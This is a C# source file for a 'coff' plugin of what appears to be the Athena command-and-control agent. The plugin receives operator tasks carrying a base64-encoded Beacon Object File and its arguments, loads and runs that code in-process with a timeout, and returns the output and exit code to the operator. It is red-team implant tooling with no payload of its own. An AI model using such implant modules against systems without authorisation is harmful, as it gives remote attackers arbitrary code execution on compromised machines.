using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.IO;
using coff.coff;
using Athena.Commands;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Coff : IPlugin
    {
        public string Name => "coff";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            try
            {
                //Need Args
                // asm - base64 encoded buffer of bof
                // functionName - name of function to be called
                // arguments - base64 encoded byteArray of bof arguments from beacon generate
                // timeout - timeout for thread to wait before killing bof execution (in seconds)
                BofRunner br = new BofRunner(args);
                br.LoadBof();
                BofRunnerOutput bro = br.RunBof(60);
                TaskResponseHandler.Write(bro.Output + Environment.NewLine + $"Exit Code: {bro.ExitCode}", args["task-id"], true);
            }
            catch (Exception e)
            {
                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
